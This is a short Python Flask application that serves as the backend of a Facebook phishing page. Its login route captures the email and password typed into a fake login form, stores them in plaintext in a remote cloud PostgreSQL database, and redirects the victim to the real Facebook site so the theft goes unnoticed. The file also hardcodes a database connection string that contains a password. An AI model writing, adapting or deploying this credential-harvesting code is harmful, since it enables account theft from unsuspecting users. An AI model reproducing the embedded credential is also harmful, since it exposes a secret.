import os
import psycopg2
from flask import Flask, request, render_template, redirect

app = Flask(__name__)

# This checks if Render has provided a live URL. 
# If not, it falls back to your external URL so it still runs locally on your Kali laptop!
DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://fb_database_4o6o_user:9IgEHyR3I9CgDXOfpf0VUWqXI8kBMYFO@dpg-d85lj45ckfvc73e1kedg-a.ohio-postgres.render.com/fb_database_4o6o')

def init_db():
    """Creates the data table automatically if it doesn't exist yet"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS records (
            id SERIAL PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

@app.route('/login', methods=['POST'])
def login():
    # Grab the username and password from your HTML form fields
    username = request.form.get('email')  # Check your HTML 'name' attribute for these
    password = request.form.get('pass')   # Make sure these match your HTML exactly!
    
    if username and password:
        # Connect to the cloud database and insert the logs
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO records (username, password) VALUES (%s, %s)", 
            (username, password)
        )
        conn.commit()
        cur.close()
        conn.close()
    
    # Redirect them to the real Facebook or a fake error page after capturing data
    return redirect("https://www.facebook.com") 

if __name__ == '__main__':
    init_db()  # Initializes the database when you run the app
    app.run(debug=True)